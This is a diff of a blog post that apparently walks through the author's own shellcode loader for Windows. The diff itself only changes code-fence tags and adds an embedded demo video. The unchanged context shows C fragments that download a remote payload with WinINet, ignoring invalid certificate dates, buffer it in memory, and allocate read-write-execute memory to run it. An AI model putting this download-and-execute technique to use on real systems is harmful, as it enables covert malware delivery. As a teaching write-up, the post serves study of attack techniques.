@@ -36,7 +36,7 @@ In this part, it starts an Internet session using [InternetOpenW](https://learn.
 
 
 Opening the URL:
-```C
+```c
 hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, 0,
     INTERNET_FLAG_RELOAD |
     INTERNET_FLAG_IGNORE_CERT_DATE_INVALID |
@@ -48,7 +48,7 @@ Dynamic memory management:
 ```c
 pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
 ```
-```C
+```c
 PBYTE pNewBuffer;
 if (pBytes == NULL) {
     pNewBuffer = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
@@ -60,7 +60,7 @@ else {
 Here I implemented a section that manages memory incrementally during the download. First, it allocates a temporary buffer to receive data in chunks. On the first read, it creates a main buffer with the exact size of the received chunk. For each new piece of data, it dynamically expands the main buffer using memory reallocation, which allows resizing the existing block and fills the new area with zeros. This enables building the complete file in memory efficiently, concatenating all chunks without wasting resources, adapting to files of any size in an optimized way.
 
 Error handling:
-```C
+```cpp
 _Cleanup:
     if (hInternetFile) InternetCloseHandle(hInternetFile);
     if (hInternet)     InternetCloseHandle(hInternet);
@@ -75,7 +75,7 @@ _Cleanup:
 LocalFree releases the temporary buffer. In case of failure, the main buffer is also freed and the return pointers are reset.
 
 Executable memory allocation:
-```c
+```cpp
 LPVOID execMem = VirtualAlloc(NULL, Size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 ```
 Executable memory allocation is performed using [VirtualAlloc](https://learn.microsoft.com/en-us/windows/win32/memory/allocating-virtual-memory). NULL allows the system to choose the optimal base address. MEM_COMMIT | MEM_RESERVE allocates both address space and physical storage. PAGE_EXECUTE_READWRITE sets dangerous permissions that allow reading, writing, and execution.
@@ -90,3 +90,6 @@ Executing the Loader:
 ![alt text](/assets/post7/executando.jpeg)
 ![alt text](/assets/post7/rodou1.jpeg)
 
+## Demonstration video of my loader being executed
+<iframe width="560" height="315" src="https://www.youtube.com/embed/QbRjGSEm_JU" 
+title="YouTube video" frameborder="0" allowfullscreen></iframe>
